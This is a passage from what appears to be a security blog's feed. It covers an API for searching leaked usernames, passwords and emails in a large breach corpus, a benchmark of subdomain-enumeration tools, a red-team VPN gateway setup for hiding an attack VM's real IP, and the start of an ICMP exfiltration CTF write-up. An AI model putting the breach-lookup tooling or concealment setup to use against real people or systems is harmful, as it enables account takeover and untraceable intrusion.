get <span style="color:#e6db74">&#39;/usernames/:name&#39;</span> <span style="color:#66d9ef">do</span>
  user <span style="color:#f92672">=</span> <span style="color:#66d9ef">Username</span><span style="color:#f92672">.</span>find_by(name: params<span style="color:#f92672">[</span><span style="color:#e6db74">:name</span><span style="color:#f92672">]</span>)
  paginated(user, params)
<span style="color:#66d9ef">end</span>

get <span style="color:#e6db74">&#39;/passwords/:password&#39;</span> <span style="color:#66d9ef">do</span>
  password <span style="color:#f92672">=</span> <span style="color:#66d9ef">Password</span><span style="color:#f92672">.</span>find_by(<span style="color:#e6db74">password</span>: params<span style="color:#f92672">[</span><span style="color:#e6db74">:password</span><span style="color:#f92672">]</span>)
  paginated(password, params)
<span style="color:#66d9ef">end</span>

get <span style="color:#e6db74">&#39;/emails/:email&#39;</span> <span style="color:#66d9ef">do</span>
  user, domain <span style="color:#f92672">=</span> params<span style="color:#f92672">[</span><span style="color:#e6db74">:email</span><span style="color:#f92672">].</span>split(<span style="color:#e6db74">&#39;@&#39;</span>)
  emails <span style="color:#f92672">=</span> <span style="color:#66d9ef">Record</span><span style="color:#f92672">.</span>joins(<span style="color:#e6db74">:username</span>)
    <span style="color:#f92672">.</span>where(<span style="color:#e6db74">&#34;usernames.name = ?&#34;</span>, user)
    <span style="color:#f92672">.</span>where(<span style="color:#e6db74">&#34;domains.domain = ?&#34;</span>, domain)
  prepare(emails)
<span style="color:#66d9ef">end</span>
</code></pre></div><p>Finally, with the API complete, I jumped into writing a web interface that could really leverage
the pivoting capabilities we enabled by configuring our schema and ORM the way we did. I&rsquo;d been
looking for a reason to try out Reactive Programming for a while, so I opted for
<a href="https://svelte.dev/">Svelte</a> as my front-end framework of choice.</p>
<blockquote>
<p><strong>Dev Tangent</strong> React.js is <em>not</em> Reactive.
For a glimpse into the powers of Reactive Programming, I recommend this talk.
<a href="https://www.youtube.com/watch?v=Bfi96LUebXo">https://www.youtube.com/watch?v=Bfi96LUebXo</a></p>
</blockquote>
<p>Svelte acts like a JavaScript &ldquo;compiler&rdquo; instead of a traditional JavaScript framework.  Because the
code you write runs through this compilation process, only the components of Svelte that you
need are added to your final packed JavaScript, keeping bloat down, and eliminating the need for
pre-processors like Webpack and their complicated configuration files. Additionally, any data you
declare as &ldquo;reactive&rdquo; is monitored for change and updated anywhere it&rsquo;s referenced. Think:
spreadsheet cells that are members of a formula&rsquo;s data set.</p>
<h2 id="benchmarks-and-data">Benchmarks and Data</h2>
<p>During this entire process, there were many lessons learned, project restarts, and hair pulled.
Bottom line, respect your Database Admins. Take them to lunch. Their job requires some very
specific and complicated knowledge.</p>
<p>Also, databases are a feat of real Software Engineering.</p>
<p>This project started completely in Ruby, and then I eventually moved the seeder to Golang. The
following table shows the chunks of time I shaved off,  along with what I did to save that time.</p>
<p>This is highly unscientific and remember that each row indicating improvement is a result of every
change that is listed above it.</p>
<table>
<thead>
<tr>
<th>Seeding ETA</th>
<th>Change That Shaved Time</th>
</tr>
</thead>
<tbody>
<tr>
<td>2 years</td>
<td><del>bad</del> naive ideas</td>
</tr>
<tr>
<td>1 year</td>
<td>Buying an SSD</td>
</tr>
<tr>
<td>10 months</td>
<td>Multithreaded Seeding</td>
</tr>
<tr>
<td>6 months</td>
<td>Data validation moved to the database</td>
</tr>
<tr>
<td>4 months</td>
<td>Database tuning</td>
</tr>
<tr>
<td>3 months</td>
<td>Seeder re-written in Go</td>
</tr>
<tr>
<td>2 months</td>
<td>Transactions</td>
</tr>
</tbody>
</table>
<p>Only after all these changes, was I finally saturating the IO of my SSD.</p>
<p>I should note that the rate of new records added begins to slow drastically as we encounter more
and more duplicate entires in the database. I wish I&rsquo;d kept a count of NON_UNIQUE_RECORD errors to
report. I&rsquo;m a bad scientist and I feel bad.</p>
<p>All stats are for files with the <code>txt</code> extension only.</p>
<p>Original line count</p>
<pre tabindex="0"><code>27,472,858,235
</code></pre><p>Listing of the data after being split and uniqued:</p>
<pre tabindex="0"><code>-rw-r--r-- 1 alex alex 296G Nov 27 19:20 usernames.txt
-rw-rw-r-- 1 alex alex  18G Dec  3 11:04 usernames_uniq.txt
-rw-r--r-- 1 alex alex 260G Nov 27 19:20 domains.txt
-rw-rw-r-- 1 alex alex 2.3G Dec  2 08:00 domains_uniq.txt
-rw-r--r-- 1 alex alex 250G Nov 27 19:20 passwords.txt
-rw-rw-r-- 1 alex alex  16G Dec  1 02:13 passwords_uniq.txt
</code></pre><p>Line counts of split components pre and post uniquing:</p>
<pre tabindex="0"><code> 27472857767 domains.txt
 27472858235 passwords.txt
 27472857744 usernames.txt

   67031505 domains_uniq.txt
  958883636 passwords_uniq.txt
 1296186909 usernames_uniq.txt
</code></pre><!--
rg'd email:pass
10.001.143.386 /tank/torrents/mailpass.txt
-->
]]></content>
        </item>
        
        <item>
            <title>Stop Using Python for Subdomain Enumeration</title>
            <link>https://ctrl.red/posts/2019/04/stop-using-python-for-subdomain-enumeration/</link>
            <pubDate>Sat, 20 Apr 2019 13:02:17 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2019/04/stop-using-python-for-subdomain-enumeration/</guid>
            <description>&lt;p&gt;Python (and all other scripting languages) use the host system&amp;rsquo;s name resolution APIs.
Skip the bottleneck and craft the DNS packets manually.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Python (and all other scripting languages) use the host system&rsquo;s name resolution APIs.
Skip the bottleneck and craft the DNS packets manually.</p>
<h2 id="setup">Setup</h2>
<p><strong>Tools Tested</strong>:</p>
<ul>
<li>Subbrute - <a href="https://github.com/TheRook/subbrute">https://github.com/TheRook/subbrute</a></li>
<li>Fernmelder - <a href="https://github.com/stealth/fernmelder">https://github.com/stealth/fernmelder</a></li>
<li>Amass - <a href="https://github.com/OWASP/Amass">https://github.com/OWASP/Amass</a></li>
</ul>
<p><strong>Wordlist</strong>:</p>
<ul>
<li><a href="https://github.com/danielmiessler/SecLists">Seclists</a> - Discovery/DNS/subdomains-top1mil-110000.txt</li>
</ul>
<p><strong>DNS Resolvers</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">4.2.2.1
1.1.1.1
8.8.8.8
64.6.64.6
77.88.8.8
74.82.42.42
4.2.2.2
1.0.0.1
8.8.4.4
4.2.2.3
9.9.9.10
64.6.65.6
77.88.8.1
4.2.2.4
</code></pre></div><h2 id="results">Results</h2>
<p><em>tests performed on WiFi. YMMV.</em></p>
<table>
<thead>
<tr>
<th>Tool</th>
<th>Command</th>
<th>Result</th>
</tr>
</thead>
<tbody>
<tr>
<td>SubBrute</td>
<td><code>./subbrute.py -s top110k.txt -r resolvers.txt example.com</code></td>
<td><code>7.79s user 1.67s system 1% cpu 15:37.04 total</code></td>
</tr>
<tr>
<td>Amass</td>
<td><code>amass -d example.com -brute -w top110k.txt -noalts -norecursive</code></td>
<td><code>87.49s user 71.32s system 44% cpu 5:54.27 total</code></td>
</tr>
<tr>
<td>Fernmelder</td>
<td><code>awk '{print $1&quot;.example.com&quot;}' top110k.txt | fernmelder -4 -N 4.2.2.1 -N 1.1.1.1 -N 8.8.8.8 -N 64.6.64.6 -N 77.88.8.8 -N 74.82.42.42 -N 4.2.2.2 -N 1.0.0.1 -N 8.8.4.4 -N 4.2.2.3 -N 9.9.9.10 -N 64.6.65.6 -N 77.88.8.1 -N 4.2.2.4 -A</code></td>
<td><code>3.17s user 10.56s system 6% cpu 3:24.90 total </code></td>
</tr>
</tbody>
</table>
<h2 id="background">Background</h2>
<p>A few years ago I was introduced to a tool called Fernmelder for DNS subdomain enumeration. I&rsquo;d
already been using tools like SubBrute and sublister for this purpose but my friend insisted I try
Fernmelder. It&rsquo;s a bit old school in the way it handles its inputs, as you can see from the chart
above. After trying it out, I was blown away and started using it exclusively. Enumerations that
typically lasted a few minutes were done in mere seconds.</p>
<p>Why was it so much faster? Was it because Fernmelder is written in C? Well, probably, but it turns
out that Fernmelder manually crafts DNS queries and sends them straight down TCP socket
connections.  But still, why is this faster?</p>
<p>When an interpreted language requests an IP address for a hostname, this request gets passed up to
the runtime. The runtime interacts with the operating system, which in turn queries its
preconfigured DNS server. In Linux, the syscall responsible for doing this would be <code>glibc</code>&rsquo;s
<a href="http://man7.org/linux/man-pages/man3/gethostbyname.3.html"><code>gethostbyname</code></a>.
It will do this for each hostname you&rsquo;re trying to enumerate. That ends up being a lot of overhead
when trying to blast through 3 million DNS requests.</p>
<p>Some other tools that also assist in enumerating subdomains are Amass and SubBrute. Many of these
subdomain enumeration tools do much more than just attempt to resolve names from a wordlist. Amass
is essentially a suite of host enumeration tools and as such would be a more viable tool for use by
a professional tester. For the purposes of this post, though, we&rsquo;re just looking at raw speed
regarding hostname resolution.</p>
<h2 id="analysis">&ldquo;Analysis&rdquo;</h2>
<p>I&rsquo;ll compare the difference in implementation between Amass and SubBrute. (I don&rsquo;t know C well
enough to explain Fernmelder). Amass is similar to Fernmelder in that it manually creates the
DNS request packet.</p>
<p>Looking at the
<a href="https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L599-L619">relevant Amass source code</a>
, we can see the creation of the request packet in the <code>queryMessage</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L599-L619
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">queryMessage</span>(<span style="color:#a6e22e">id</span> <span style="color:#66d9ef">uint16</span>, <span style="color:#a6e22e">name</span> <span style="color:#66d9ef">string</span>, <span style="color:#a6e22e">qtype</span> <span style="color:#66d9ef">uint16</span>) <span style="color:#f92672">*</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Msg</span> {
	<span style="color:#a6e22e">m</span> <span style="color:#f92672">:=</span> <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Msg</span>{
		<span style="color:#a6e22e">MsgHdr</span>: <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">MsgHdr</span>{
			<span style="color:#a6e22e">Authoritative</span>:     <span style="color:#66d9ef">false</span>,
			<span style="color:#a6e22e">AuthenticatedData</span>: <span style="color:#66d9ef">false</span>,
			<span style="color:#a6e22e">CheckingDisabled</span>:  <span style="color:#66d9ef">false</span>,
			<span style="color:#a6e22e">RecursionDesired</span>:  <span style="color:#66d9ef">true</span>,
			<span style="color:#a6e22e">Opcode</span>:            <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">OpcodeQuery</span>,
			<span style="color:#a6e22e">Id</span>:                <span style="color:#a6e22e">id</span>,
			<span style="color:#a6e22e">Rcode</span>:             <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">RcodeSuccess</span>,
		},
		<span style="color:#a6e22e">Question</span>: make([]<span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Question</span>, <span style="color:#ae81ff">1</span>),
	}
	<span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">Question</span>[<span style="color:#ae81ff">0</span>] = <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Question</span>{
		<span style="color:#a6e22e">Name</span>:   <span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Fqdn</span>(<span style="color:#a6e22e">name</span>),
		<span style="color:#a6e22e">Qtype</span>:  <span style="color:#a6e22e">qtype</span>,
		<span style="color:#a6e22e">Qclass</span>: uint16(<span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">ClassINET</span>),
	}
	<span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">Extra</span> = append(<span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">Extra</span>, <span style="color:#a6e22e">setupOptions</span>())
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">m</span>
}
</code></pre></div><p>This function is called from a Resolver&rsquo;s private <code>writeMessage</code> function. See line 4 below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#75715e">// https://github.com/OWASP/Amass/blob/7c1b5cd946e5d97c802a3559b845e7debc1e2008/amass/resolvers.go#L261-L275
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">r</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">resolver</span>) <span style="color:#a6e22e">writeMessage</span>(<span style="color:#a6e22e">co</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">dns</span>.<span style="color:#a6e22e">Conn</span>, <span style="color:#a6e22e">req</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">resolveRequest</span>) {
	<span style="color:#a6e22e">msg</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">queryMessage</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">getID</span>(), <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Name</span>, <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Qtype</span>)

	<span style="color:#a6e22e">co</span>.<span style="color:#a6e22e">SetWriteDeadline</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>().<span style="color:#a6e22e">Add</span>(<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">WindowDuration</span>))
	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">co</span>.<span style="color:#a6e22e">WriteMsg</span>(<span style="color:#a6e22e">msg</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
		<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">pullRequest</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">MsgHdr</span>.<span style="color:#a6e22e">Id</span>)
		<span style="color:#a6e22e">estr</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;DNS error: Failed to write query msg: %v&#34;</span>, <span style="color:#a6e22e">err</span>)
		<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">returnRequest</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">makeResolveResult</span>(<span style="color:#66d9ef">nil</span>, <span style="color:#66d9ef">true</span>, <span style="color:#a6e22e">estr</span>, <span style="color:#ae81ff">100</span>))
		<span style="color:#66d9ef">return</span>
	}

	<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Timestamp</span> = <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>()
	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">queueRequest</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">MsgHdr</span>.<span style="color:#a6e22e">Id</span>, <span style="color:#a6e22e">req</span>)
	<span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">updatesAttempts</span>()
}
</code></pre></div><p>Amass will then add this request to an in-memory queue where a separate goroutine processes the
job.</p>
<p>Compare this to SubBrute. Even though SubBrute can operate on multiple threads, it&rsquo;s still bound to
the eventual calling of the operating system&rsquo;s DNS query mechanism here:</p>
<p><code>query = dnslib.DNSRecord.question(hostname, query_type.upper().strip())</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># https://github.com/TheRook/subbrute/blob/master/subbrute.py#L53-L64</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">query</span>(self, hostname, query_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ANY&#39;</span>, name_server <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>, use_tcp <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>):
    ret <span style="color:#f92672">=</span> []
    response <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
    <span style="color:#66d9ef">if</span> name_server <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>:
        name_server <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_ns()
    <span style="color:#66d9ef">else</span>:
        self<span style="color:#f92672">.</span>wildcards <span style="color:#f92672">=</span> {}
        self<span style="color:#f92672">.</span>failed_code <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
    self<span style="color:#f92672">.</span>last_resolver <span style="color:#f92672">=</span> name_server
    query <span style="color:#f92672">=</span> dnslib<span style="color:#f92672">.</span>DNSRecord<span style="color:#f92672">.</span>question(hostname, query_type<span style="color:#f92672">.</span>upper()<span style="color:#f92672">.</span>strip())
    <span style="color:#66d9ef">try</span>:
        response_q <span style="color:#f92672">=</span> query<span style="color:#f92672">.</span>send(name_server, <span style="color:#ae81ff">53</span>, use_tcp, timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span>)

</code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Fernmelder clocked in at 3.5 minutes. Next comes Amass at 6 minutes, and far behind is SubBrute.</p>
<p>Am I really all that concerned with saving 10 minutes on a task that is probably only run once
during a campaign? Should you be? Most certainly not, but I was curious enough at the discrepancy
in time and found the result interesting enough to share.</p>
<p>In regards to our third place test-case, this could really be any tool that relies on an OS API
call for name resolution. Perhaps in a future blog post I&rsquo;ll compare apples to apples and create a
python tool that manually crafts DNS request packets and sends them down a wire. That would be an
interesting test.</p>
<p>Overall, I&rsquo;ll probably move forward using Amass, given the plethora of other utilities available
within it. Despite my appreciation for Fernmelder&rsquo;s charming old-school interface of taking STDIN
and its speed, Amass, while not the fastest in this one specific task, seems the more viable
Professional&rsquo;s tool.</p>]]></content>
        </item>
        
        <item>
            <title>Mind Your OOPSEC</title>
            <link>https://ctrl.red/posts/2018/12/mind-your-oopsec/</link>
            <pubDate>Sun, 30 Dec 2018 17:06:30 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2018/12/mind-your-oopsec/</guid>
            <description>OPSEC is hard and those OOPS moments can often cost you a campaign when Red teaming. In this post I&amp;rsquo;ll go over how I set up my VMs so I never have to remember to turn on a VPN, stress about having some &amp;lsquo;killswitch&amp;rsquo; fail, or being on the losing end of some network-race-condition nonsense when waking my laptop.
Automation isn&amp;rsquo;t always about convenience for the user. Sometimes it&amp;rsquo;s also about determinism.</description>
            <content type="html"><![CDATA[<p><img src="title.png" alt=""></p>
<p>OPSEC is hard and those OOPS moments can often cost you a campaign when Red teaming. In this post
I&rsquo;ll go over how I set up my VMs so I never have to remember to turn on a VPN, stress about having
some &lsquo;killswitch&rsquo; fail, or being on the losing end of some network-race-condition nonsense when
waking my laptop.</p>
<p>Automation isn&rsquo;t always about convenience for the user. Sometimes it&rsquo;s also about determinism. It&rsquo;s
about knowing that no matter what edge cases may or may not exist now, or in the future, they&rsquo;ll
have no bearing on your desired outcome. In this sense, we&rsquo;re talking about technology that works
<em>for</em> you, without being in your way. You shouldn&rsquo;t even notice it&rsquo;s there until something is broken.</p>
<p>So let&rsquo;s move this problem &ldquo;up the stack&rdquo;, so to speak. I&rsquo;m not really sharing anything new here,
just putting it all in one place and talking about how to build it from scratch. In fact, this is
the exact way <a href="https://www.whonix.org/wiki/About#Security_by_Isolation">Whonix</a>
recommends you run their distribution; by using their Gateway VM.</p>
<p>Enough, so what are we talking about here? We&rsquo;re talking about creating a VM that acts as a
gateway, or router, for your attack VM. We&rsquo;ll use some <code>iptables</code> rules to ensure that any client
of our gateway can only communicate through the <code>tun0</code> interface. We&rsquo;ll also create a DHCP server
for your connecting clients, and of course, the VMWare settings to make all this possible. So let&rsquo;s
get started.</p>
<p>I&rsquo;ll be using Debian for the gateway VM, but feel free to use any distro you like. They&rsquo;re all
perfectly capable.</p>
<p>I&rsquo;ll be using VMWare Workstation, but this works in most others too.</p>
<p>Begin by creating your VM and assigning it 2 network interfaces in your virtualization software of
choice. One network can be NAT. To avoid complications, the other network should be a new one that
isn&rsquo;t used by other VMs. If you need to make a new network, some VM solutions have some sort of
virtual network manager in their settings.</p>
<p><img src="1.png" alt="Alt"></p>
<p>Here, the NAT network will provide internet access to our gateway, allowing it to VPN out. The
other network will serve DHCP and internet to any guest OSes that happen to have the vmnet2
interface assigned by the virtualization software. More on that later.</p>
<p>Power on the gateway VM.</p>
<p>Note the output of <code>ip</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ip addr show <span style="color:#75715e"># or &#39;ip a s&#39; for short</span>
</code></pre></div><p>In my case, I can see that <code>ens33</code> is the NAT interface because it pulled DHCP from VMWare&rsquo;s virtual
network. <code>ens36</code> has no IP because we haven&rsquo;t assigned it one, nor is there a DHCP server on the
<code>vmnet2</code> network. Continue by installing our dependencies.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt update
sudo apt install dnsmasq openvpn iptables-persistent openssh-server
</code></pre></div><p>SSH in.</p>
<p>You&rsquo;ll also need an account with a VPN provider that provides <code>*.ovpn</code> files. I&rsquo;ll be going with
Private Internet Access for this one.</p>
<p>This engagement requires we be located in Mexico.
Download the PIA VPN profiles to the gateway:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://www.privateinternetaccess.com/openvpn/openvpn.zip
unzip -c openvpn.zip Mexico.ovpn &gt; /etc/openvpn/client/Mexico.ovpn
</code></pre></div><p>Let&rsquo;s start by configuring the Debian to automatically start the VPN on boot.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create a systemd unit that starts the tunnel on system start</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/systemd/system/openvpn.service
</span><span style="color:#e6db74">[Unit]
</span><span style="color:#e6db74">Description=Start VPN on boot
</span><span style="color:#e6db74">Requires=networking.service
</span><span style="color:#e6db74">After=networking.service
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[Service]
</span><span style="color:#e6db74">User=root
</span><span style="color:#e6db74">Type=simple
</span><span style="color:#e6db74">ExecStart=/usr/sbin/openvpn --config Mexico.ovpn --auth-user-pass up.txt
</span><span style="color:#e6db74">WorkingDirectory=/etc/openvpn/client
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">[Install]
</span><span style="color:#e6db74">WantedBy=multi-user.target
</span><span style="color:#e6db74">FILE</span>
</code></pre></div><p>Create the <code>up.txt</code> that holds your OpenVPN profile credentials:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create the auth file for autostarting the VPN tunnel</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/openvpn/client/up.txt
</span><span style="color:#e6db74">${your_ovpn_user}
</span><span style="color:#e6db74">${your_ovpn_pass}
</span><span style="color:#e6db74">FILE</span>

chmod <span style="color:#ae81ff">400</span> /etc/openvpn/client/up.txt

<span style="color:#75715e"># Recognize the changes by reloading the daemon and enable the unit</span>
<span style="color:#75715e">#</span>
systemctl daemon-reload
systemctl enable openvpn.service
systemctl start openvpn.service
</code></pre></div><p>At this point, you should have a working VPN connection and a <code>tun0</code> interface when you run <code>ip a s</code>.
If you&rsquo;re following along, you should get <code>Mexico City</code> when you:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl ipconfig.io/city
</code></pre></div><p>Next up, we enable IP forwarding on the kernel and set up our DHCP server. Feel free to change the
IP values so they suit your needs.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Uncomment the setting that allows packet forwarding between network interfaces</span>
<span style="color:#75715e">#</span>
sed -i <span style="color:#e6db74">&#34;/net.ipv4.ip_forward=1/ s/#*//&#34;</span> /etc/sysctl.conf

<span style="color:#75715e"># Configure the static address for the adapter serving DHCP</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/network/interfaces
</span><span style="color:#e6db74">source-directory /etc/network/interfaces.d
</span><span style="color:#e6db74">auto lo
</span><span style="color:#e6db74">iface lo inet loopback
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">auto ens33
</span><span style="color:#e6db74">iface ens33 inet dhcp
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">allow-hotplug ens36
</span><span style="color:#e6db74">iface ens36 inet static
</span><span style="color:#e6db74">    address 192.168.100.1
</span><span style="color:#e6db74">    netmask 255.255.255.0
</span><span style="color:#e6db74">    network 192.168.100.0
</span><span style="color:#e6db74">FILE</span>

<span style="color:#75715e"># Configure the DHCP server that will give our clients an IP</span>
<span style="color:#75715e">#</span>
cat <span style="color:#e6db74">&lt;&lt;FILE &gt; /etc/dnsmasq.conf
</span><span style="color:#e6db74">interface=ens36
</span><span style="color:#e6db74">bind-interfaces
</span><span style="color:#e6db74">dhcp-range=192.168.100.100,192.168.100.200,255.255.255.0,24h
</span><span style="color:#e6db74">FILE</span>
</code></pre></div><p>Load the interface changes and restart dnsmasq and ensure it&rsquo;s running properly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ifup ens36
systemctl restart dnsmasq
systemctl status dnsmasq
</code></pre></div><p>One last step, just set and save some <code>iptables</code> rules:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Configure the firewall to redirect packets coming from the client net</span>
<span style="color:#75715e"># to leave through the VPN interface. Deny all but established</span>
<span style="color:#75715e"># connections coming from the tun0 interface. Persist the rules.</span>
<span style="color:#75715e">#</span>
iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -o tun0 -j MASQUERADE
iptables -A FORWARD -s 192.168.100.0/24 -o tun0 -j ACCEPT
iptables -A FORWARD -d 192.168.100.0/24 -m state --state ESTABLISHED,RELATED -i tun0 -j ACCEPT

mkdir /etc/iptables
iptables-save &gt; /etc/iptables/rules.v4
</code></pre></div><p>Reboot the machine and SSH back in. You should see a <code>tun0</code> interface running and the output of
<code>ss -lupn</code> should show dnsmasq listening on <code>68/UDP</code>.</p>
<p>We&rsquo;re ready to connect a machine to our client network.</p>
<p>Head over to any existing VM and set its network adapter to the same secondary adapter you
connected to the gateway VM. In my case, that would be <code>vmnet2</code>.</p>
<p><img src="2.png" alt="Alt"></p>
<p>Boot your VM and check that it&rsquo;s received a valid IP address in the range you specified.</p>
<p><img src="3.png" alt="Alt"></p>
<p>Any machines to which you connect to the <code>vmnet2</code> network interface will be forced
through VPN without needing a client on the attack VM itself. Ensure that your attack VMs have only
this 1 network interface attached. If the gateway VM&rsquo;s VPN ever drops, you will cease to have
internet on the attack VM, preventing any background process from disclosing your real IP.</p>
<p>This ends up being a nice way to share VPN profiles between accounts as well. It&rsquo;s been pretty
useful to have both Windows and Linux machines on the HackTheBox network, for example.</p>
<p>There are plenty of solutions that let you point and click to achieve this same result. <a href="https://opnsense.org/users/get-started/">OPNSense</a>,
<a href="https://www.pfsense.org/">PFSense</a>, <a href="https://github.com/KaiserSoft/PIA-Tunnel">PIA Tunnel</a> to name
a few. They may also serve your needs in this regard.</p>
]]></content>
        </item>
        
        <item>
            <title>Analyzing Data Exfiltration over ICMP</title>
            <link>https://ctrl.red/posts/2018/05/analyzing-data-exfiltration-over-icmp/</link>
            <pubDate>Fri, 11 May 2018 20:06:55 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2018/05/analyzing-data-exfiltration-over-icmp/</guid>
            <description>I&amp;rsquo;m a big fan of learning through competition. Capture The Flag games have tremendous utility for training within the Security sector and even outside of it. Intentionally vulnerable web applications, like OWASP&amp;rsquo;s JuiceShop, are excellent tools for assisting in developing Secure Software Development Life-cycle programs within an organization.
So let&amp;rsquo;s take an exercise I recently came across in a CTF event. The skills required to solve the challenge are actually quite useful in real-world defensive scenarios.</description>
            <content type="html"><![CDATA[<p><img src="title.jpg" alt=""></p>
<p>I&rsquo;m a big fan of learning through competition. Capture The Flag games have tremendous utility for
training within the Security sector and even outside of it. Intentionally vulnerable web
applications, like <a href="https://www.owasp.org/index.php/OWASP_Juice_Shop_Project">OWASP&rsquo;s JuiceShop</a>,
are excellent tools for assisting in developing Secure Software Development Life-cycle programs
within an organization.</p>
<p>So let&rsquo;s take an exercise I recently came across in a CTF event. The skills required to solve the
challenge are actually quite useful in real-world defensive scenarios.</p>
<p><strong>Story Time</strong></p>
<p>You work for the Info Sec team of Acme Co. As part of your security toolset, you&rsquo;ve set up an
Intrusion Detection System on a span port in your data center. During a routine Threat Hunting
exercise, your team discovers some anomalous traffic coming from a particular server. Your IDS
says that there was a strange amount of ICMP traffic coming from this machine. You go back to when
